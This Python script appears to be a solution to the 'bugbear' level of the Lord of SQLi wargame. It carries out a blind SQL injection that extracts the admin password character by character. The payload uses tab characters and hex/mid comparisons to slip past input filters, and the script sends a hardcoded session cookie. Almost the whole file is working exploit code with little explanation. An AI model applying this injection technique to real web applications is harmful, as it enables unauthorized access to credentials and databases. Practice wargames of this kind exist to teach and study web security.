# -*- coding: utf-8 -*-
import urllib.request

answer = ""
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
session_id = "PHPSESSID="+"rcgm263oqae8tnvs1c4urdm6hl"

url_start = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"+'?'



for i in range(1, 9):
    try:
        for j in range(33, 128):
            url = url_start+'no=1%09||%09id%09in%09(%22admin%22)%09%26%26%09hex(mid(pw,{},1))%09in%09(hex({}))'.format(i,j)

            print(url)

            req = urllib.request.Request(url) #엔터 치기전 상태
            req.add_header('User-agent', user_agent) #헤더값 설정(los가 뱉어냄)
            req.add_header("Cookie", session_id)

            res = urllib.request.urlopen(req) # 엔터누른 효과
            data = res.read().decode('utf-8') # 본문만 가져오기

            if data.find('<h2>Hello admin</h2>') != -1:
                print(chr(j))
                answer = answer + chr(j)
                break
    except Exception as e:
        continue

print(answer)




